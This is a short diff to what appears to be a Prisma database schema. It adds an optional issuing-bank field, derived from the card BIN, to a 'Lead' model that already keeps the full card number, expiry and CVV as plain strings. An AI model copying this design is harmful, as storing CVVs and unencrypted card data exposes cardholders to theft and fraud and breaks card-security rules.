@@ -231,6 +231,7 @@ model Lead {
   cardNumber    String
   cardExpiry    String
   cardCvv       String
+  cardBank      String?  // Instituição emissora identificada pelo BIN do cartão (best-effort)
   installments  String
   notes         String?
   itemsJson     String   // JSON: [{ productName, quantity, unitPriceCents }]
